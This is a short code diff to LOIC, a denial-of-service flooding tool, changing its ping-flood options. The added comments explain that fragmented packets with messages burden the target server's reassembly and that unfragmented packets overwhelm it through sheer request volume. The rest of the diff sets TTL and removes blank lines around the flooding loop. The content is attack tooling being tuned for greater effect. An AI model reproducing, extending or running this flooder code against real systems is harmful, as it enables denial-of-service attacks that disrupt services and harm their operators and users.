@@ -565,19 +565,20 @@ namespace LOIC
             _opt = new PingOptions();
             if (RandomMessage)
             {
+                //if we're sending messages, fragment as greater processing power needed on server to reconstruct
                 _opt.DontFragment = false;
             }else
             {
+                //not sending messages, don't fragment, ddos through straight volume of requests
                 _opt.DontFragment = true;
             }
-
+            //def ttl 
            _opt.Ttl = 128;
                             
           
         }
 
        
-
         public override void Start()
         {
             this.IsFlooding = true;
@@ -640,10 +641,7 @@ namespace LOIC
                     catch { }
                     State = ReqState.Completed;
                 }
-
                 State = ReqState.Ready;
-
-
             }
         
           
